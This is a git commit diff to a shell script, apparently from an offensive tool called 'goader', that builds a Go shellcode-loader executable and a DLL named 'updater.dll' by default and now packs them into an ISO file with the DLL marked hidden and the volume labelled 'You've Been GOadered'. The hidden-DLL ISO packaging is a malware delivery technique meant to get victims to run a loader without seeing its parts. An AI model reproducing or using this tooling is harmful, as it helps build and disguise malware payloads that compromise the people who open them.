b13ca37e1d832cfda57631af43a78259eab80bc6
silversurfer <r2d2@sostup.id>
2024-05-23 17:03:44 +0000

    added functionality for third parameter to create an iso file of the generated payloads

--- generate_payload.sh
+++ generate_payload.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-
+rm payloads/*.*
 command -v go > /dev/null || { \
     echo "[!] Go is required, please install it"; exit 1; }
 if [[ $# -lt 1 ]]; then
@@ -13,6 +13,7 @@ command -v goversioninfo > /dev/null || { \
     go install \
     github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest; \
 }
+isofilename=${3:-awesome.iso}
 output_dll=${2:-updater.dll}
 sc_fullpath=$(readlink -f "$1")
 echo "[+] Full path of payload file: $sc_fullpath"
@@ -33,4 +34,10 @@ cd ../goEXE
 ./build_exe_on_linux.sh "$output_dll"
 mv goader.exe ../payloads/
 mv ../goDLL/$output_dll ../payloads/
+if [[ $# -eq 3 ]]; then
+    echo "[+] Iso file will be generated"
+    cd ../payloads
+    mkisofs -o $isofilename  -V "You've Been GOadered" -hidden "$output_dll" -allow-lowercase -l * 
+    echo "[+] Iso file created with filename $isofilename"
+fi
 echo "[+] WOOOOO, have a nice day!"
